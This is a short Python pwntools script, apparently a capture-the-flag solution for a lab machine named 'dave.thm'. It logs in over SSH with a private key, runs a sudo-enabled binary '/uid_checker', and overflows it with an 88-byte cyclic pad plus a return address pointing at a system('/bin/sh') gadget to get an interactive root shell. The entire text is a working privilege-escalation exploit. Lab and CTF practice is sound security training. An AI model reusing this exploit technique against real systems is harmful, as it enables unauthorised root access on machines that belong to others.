from pwn import *

cyclic_len = 88

payload = cyclic(cyclic_len)

payload += p64(0x4006b7)    # lea rdi *"/bin/sh"; system();

# swap dave.thm with the ip address if you don't have it set in /etc/hosts
s = ssh(host='dave.thm', user='dave', keyfile='./id_rsa')
p = s.process([ "sudo", "/uid_checker"])
# Wait for input
p.recv()
p.sendline(payload)
# enter shell
p.interactive()